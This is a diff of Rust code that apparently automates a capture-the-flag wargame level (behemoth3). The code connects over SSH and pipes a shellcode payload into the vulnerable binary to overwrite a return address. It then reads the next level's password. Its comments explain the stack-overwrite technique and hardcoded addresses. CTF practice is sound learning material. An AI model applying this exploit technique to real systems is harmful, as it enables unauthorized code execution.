@@ -23,6 +23,10 @@ use anyhow::Result;
 /// just need to overwrite the ret address (or somewhere in the got) with the stack address to run shellcode
 /// idea will be nops + shellcode + padded value + target for lower bytes, padded value + target for higher bytes
 pub fn solve(password: &str) -> Result<String> {
+
+    let mut ssh = SSHShell::connect(super::HOST, super::PORT, "behemoth3", password)?;
+    ssh.read_until("$ ")?;
+    
     let ret_addr1 = hex_decode("3cd5ffff")?; // 0xffffd52c, found by breaking at ret from main and then p $sp. had to tweak by 16 byte diffs to find the correct value remote
     let ret_addr2 = hex_decode("3ed5ffff")?; // two bytes up to write the higher bytes of the address
 
@@ -45,21 +49,15 @@ pub fn solve(password: &str) -> Result<String> {
 
     let encoded = hex_encode(&full_payload);
 
-    let session = ssh_session(super::HOST, super::PORT, "behemoth3", password)?;
-    let mut channel = session.channel_session()?;
-    create_shell(&mut channel)?;
-
-    read_until(&mut channel, "behemoth3@gibson:~$ ")?;
-
     let target = "/behemoth/behemoth3";
     println!("running 'echo -en [payload] | {target}'");
 
     let cmd = format!("echo -en \"{encoded}\" | {target}");
-    write_line(&mut channel, &cmd)?;
+    ssh.write_line(&cmd)?;
 
     println!("reading result");
 
-    let result = read_until(&mut channel, "behemoth3@gibson:~$ ")?;
+    let result = ssh.read_until("behemoth3@gibson:~$ ")?;
     let result: Vec<&str> = result.split("\n").collect();
     let result = result[result.len() - 2].trim();
     println!("retrieved behemoth4 pass '{result}'\n");
